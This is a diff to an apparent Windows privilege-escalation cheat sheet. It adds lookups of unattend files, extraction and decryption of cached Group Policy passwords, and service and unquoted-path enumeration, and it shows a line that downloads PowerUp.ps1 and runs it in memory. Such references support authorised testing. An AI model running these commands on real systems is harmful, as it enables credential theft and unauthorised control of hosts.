@@ -227,15 +227,13 @@ encoded passwords and should be reviewed:
 
 ```
 %WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattend\Unattend.xml
 %WINDIR%\Panther\Unattended.xml
+%WINDIR%\Panther\Unattend.xml
 %SystemDrive%\sysprep.inf
 %SystemDrive%\sysprep\sysprep.xml
 %WINDIR%\system32\sysprep\Unattend.xml
 %WINDIR%\system32\sysprep\Panther\Unattend.xml
-%WINDIR%\Panther\Unattend\Unattended.xml
-%WINDIR%\Panther\Unattended.xml
-%WINDIR%\Panther\Unattend\Unattend.xml
-%WINDIR%\Panther\Unattend.xml
 %SystemDrive%\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT
 %WINDIR%\panther\setupinfo
 %WINDIR%\panther\setupinfo.bak
@@ -287,6 +285,36 @@ cmdkey /list
 rundll32.exe keymgr.dll,KRShowKeyMgr
 
 runas /savecred /user:<DOMAIN | WORKGROUP>\<USERNAME> <EXE>
+```
+
+###### Cached GPP passwords
+
+GPP can be cached locally and may contain encrypted passwords that can be
+decrypted using the Microsoft public AES key.
+
+The `Get-CachedGPPPassword` cmdlet, of the `PowerSploit`'s `PowerUp` script,
+can be used to automatically retrieve the cached GPP XML files and extract the
+present passwords.
+
+```
+Get-CachedGPPPassword
+```
+
+The following commands can be used to conduct the search mannually:
+
+```
+$AllUsers = $Env:ALLUSERSPROFILE
+# If $AllUsers do not contains "ProgramData"
+$AllUsers = "$AllUsers\Application Data"
+
+Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml',
+'DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue | Select-String -pattern "cpassword"
+```
+
+The Ruby `gpp-password` script can be used to decrypt a GPP password:
+
+```
+gpp-decrypt <ENC_PASSWORD>
 ```
 
 ###### Clear text password in registry
@@ -436,14 +464,15 @@ can be used against the target, based on the architecture and platform as well a
 the available exploits in `meterpreter`.
 
  ```
-meterpreter > run post/multi/recon/local_exploit_suggester
+meterpreter> run post/multi/recon/local_exploit_suggester
 
 # OR
 
-msf > use post/multi/recon/local_exploit_suggester
+msf> use post/multi/recon/local_exploit_suggester
 msf post(local_exploit_suggester) > set SESSION <session-id>
 msf post(local_exploit_suggester) > run
 ```
+
 ###### Pre compiled exploits
 
 A collection of pre compiled Windows kernel exploits can be found on the
@@ -566,6 +595,8 @@ wmic service list config
 sc query
 
 sc qc <SERVICENAME>
+
+Get-WmiObject -Class win32_service -Property Name,PathName
 ```
 
 ###### Weak services permissions
@@ -650,6 +681,9 @@ binary paths:
 
 ```
 wmic service list full | findstr /i "PathName" | findstr /i /v "System32"
+
+Get-WmiObject -Class win32_service -Property PathName | Ft PathName
+Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32"} | Ft PathName
 ```
 
 The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
@@ -701,10 +735,12 @@ wmic service get PathName, StartMode | findstr /i /v """
 wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
 wmic service get name.pathname,startmode | findstr /i /v """
 
+Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32" -And $_.PathName -NotMatch '"' } | Ft PathName
+
 # (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
 PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
 erSploit/master/Privesc/PowerUp.ps1")
-PS> Get-ServiceUnquoted
+PS> Get-UnquotedService
 
 meterpreter> load powershell
 meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
